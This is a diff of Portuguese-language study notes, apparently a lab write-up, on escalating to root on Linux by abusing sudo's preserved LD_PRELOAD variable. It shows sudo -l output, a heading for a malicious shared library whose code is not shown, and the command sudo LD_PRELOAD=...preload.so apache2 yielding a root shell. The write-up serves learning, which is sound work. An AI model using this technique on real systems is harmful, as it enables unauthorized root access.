@@ -9,7 +9,7 @@
  
 user@debian:~$ sudo -l
 
-##### Saída:
+#Saída:
 
 User user may run the following commands on debian:
     (root) NOPASSWD: /usr/bin/find
@@ -22,13 +22,13 @@ User user may run the following commands on debian:
  - NOPASSWD = não precisa de senha para executar
  - SETENV = permite manter variáveis de ambiente (como LD_PRELOAD)
  - após usar o comando `-l | grep LD_PRELOAD` confirma que o `env_keep+=LD_PRELOAD` está ativo
-
-##### Saída 
+```
+#Saída 
 
 `env_keep+=LD_PRELOAD` 
 
  - $ ou seja, a variável LD_PRELOAD é preservada quando você usa sudo.
-
+```
 ##### Agora criamos um Codigo C malicioso:
 
 ```bash 
@@ -53,15 +53,15 @@ void _init() {
  
 ##### Agora so executar com o sudo usando o LD_PRELOAD
 
-`sudo LD_PRELOAD=/home/user/tools/sudo/preload.so apache2`
+```sudo LD_PRELOAD=/home/user/tools/sudo/preload.so apache2
 
-##### Saída:
+#Saída:
 
-`sh-4.1#`	
+sh-4.1#	
 
-`whoami`
-`Root` 
-
+whoami
+Root
+```
 - Shell root Feito
 
 ##### O que aprendi
